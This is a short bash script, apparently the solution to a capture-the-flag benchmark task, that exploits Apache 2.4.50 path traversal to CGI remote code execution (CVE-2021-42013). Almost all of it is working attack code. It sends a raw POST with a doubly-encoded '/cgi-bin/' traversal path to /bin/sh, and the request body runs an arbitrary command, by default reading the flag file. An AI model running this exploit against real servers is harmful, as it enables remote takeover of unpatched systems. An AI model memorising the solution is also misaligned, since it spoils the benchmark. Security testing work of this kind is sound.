#!/usr/bin/env bash
# XBEN-026-24 — Apache 2.4.50 path-traversal to CGI RCE (CVE-2021-42013).
# Proxy-mode twin. A doubly-encoded traversal in the /cgi-bin/ path reaches
# /bin/sh, and the request body is a shell script that prints the flag. The
# request is sent byte-for-byte with --raw-request because the encoded path and
# header framing are the subject of the test.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
CMD="${2:-cat /FLAG.txt}"
HOST="${URL#http://}"; HOST="${HOST#https://}"
SESSION="xben026p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
req="$(mktemp)"
body="echo Content-Type: text/plain; echo; $CMD"
LEN=$(printf '%s' "$body" | wc -c)
printf 'POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "$HOST" "$LEN" "$body" > "$req"
"$H5I" websec replay "$BASE" --session "$SESSION" --raw-request "$req" >/dev/null
rm -f "$req"
print_flag
